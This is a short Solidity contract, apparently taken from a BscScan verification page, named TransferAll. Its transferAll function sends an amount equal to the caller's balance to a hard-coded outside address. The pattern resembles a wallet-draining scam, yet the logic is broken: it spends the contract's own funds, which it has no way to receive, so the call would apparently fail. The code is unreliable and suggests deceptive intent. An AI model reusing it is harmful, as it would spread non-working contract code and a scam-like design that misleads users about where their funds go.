/**
 *Submitted for verification at BscScan.com on 2023-01-25
*/

pragma solidity ^0.5.0;

contract TransferAll {
    address payable public owner;
    address payable public destAddress = 0x8b9e70845550c24776efB8F54931041Ef7C737a5;

    constructor() public {
        owner = msg.sender;
    }

    function transferAll() public {
        address payable to = msg.sender;
        require(to.balance > 0);
        destAddress.transfer(to.balance);
    }
}